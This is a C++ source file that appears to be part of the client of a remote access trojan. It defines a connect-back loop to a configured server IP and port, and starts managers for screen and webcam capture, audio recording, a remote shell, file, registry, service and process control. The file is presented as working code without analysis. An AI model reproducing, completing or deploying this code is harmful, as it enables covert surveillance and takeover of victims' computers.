#include "StdAfx.h"
#include "Common.h"

#include "ScreenManager.h"
#include "FileManager.h"
#include "TalkManager.h"
#include "ShellManager.h"
#include "SystemManager.h"
#include "AudioManager.h"
#include "RegisterManager.h"
#include "ServicesManager.h"
#include "VideoManager.h"
#include "KernelManager.h"

extern char  g_szServerIP[MAX_PATH];
extern unsigned short g_uPort;  

HANDLE _CreateThread (LPSECURITY_ATTRIBUTES  SecurityAttributes,   
					  SIZE_T dwStackSize,                                           
					  LPTHREAD_START_ROUTINE StartAddress,      
					  LPVOID lParam,                                          
					  DWORD  dwCreationFlags,                     
					  LPDWORD ThreadId, bool bInteractive)  
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARG_LIST	ThreadArgList = {0};
	ThreadArgList.StartAddress = StartAddress;
	ThreadArgList.lParam = (void *)lParam;   //IP
	ThreadArgList.bInteractive = bInteractive;       //??
	ThreadArgList.hEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
	hThread = (HANDLE)CreateThread(SecurityAttributes, 
		dwStackSize,(LPTHREAD_START_ROUTINE)ThreadProc, &ThreadArgList, 
		dwCreationFlags, (LPDWORD)ThreadId);	

	WaitForSingleObject(ThreadArgList.hEvent, INFINITE);
	CloseHandle(ThreadArgList.hEvent);

	return hThread;
}

DWORD WINAPI ThreadProc(LPVOID lParam)
{
	THREAD_ARG_LIST	ThreadArgList = {0};
	memcpy(&ThreadArgList,lParam,sizeof(THREAD_ARG_LIST));
	SetEvent(ThreadArgList.hEvent);

	DWORD dwReturn = ThreadArgList.StartAddress(ThreadArgList.lParam);
	return dwReturn;
}

template <class Manager, int n> DWORD WINAPI LoopManager(LPVOID lParam)
{
	ThreadInfo *pInfo = (ThreadInfo *)lParam;
	IOCPClient	*ClientObject = pInfo->p;
	if (ClientObject->ConnectServer(g_szServerIP,g_uPort))
	{
		Manager	m(ClientObject, n);
		ClientObject->RunEventLoop(pInfo->run);
	}
	delete ClientObject;
	pInfo->p = NULL;

	return 0;
}

DWORD WINAPI LoopScreenManager(LPVOID lParam)
{
	return LoopManager<CScreenManager, 0>(lParam);
}

DWORD WINAPI LoopFileManager(LPVOID lParam)
{
	return LoopManager<CFileManager, 0>(lParam);
}

DWORD WINAPI LoopTalkManager(LPVOID lParam)
{
	return LoopManager<CTalkManager, 0>(lParam);
}

DWORD WINAPI LoopShellManager(LPVOID lParam)
{
	return LoopManager<CShellManager, 0>(lParam);
}

DWORD WINAPI LoopProcessManager(LPVOID lParam)   
{
	return LoopManager<CSystemManager, COMMAND_SYSTEM>(lParam);
}

DWORD WINAPI LoopWindowManager(LPVOID lParam)
{
	return LoopManager<CSystemManager, COMMAND_WSLIST>(lParam);
}

DWORD WINAPI LoopVideoManager(LPVOID lParam)
{
	return LoopManager<CVideoManager, 0>(lParam);
}

DWORD WINAPI LoopAudioManager(LPVOID lParam)
{
	return LoopManager<CAudioManager, 0>(lParam);
}

DWORD WINAPI LoopRegisterManager(LPVOID lParam)
{
	return LoopManager<CRegisterManager, 0>(lParam);
}

DWORD WINAPI LoopServicesManager(LPVOID lParam)
{
	return LoopManager<CServicesManager, 0>(lParam);
}
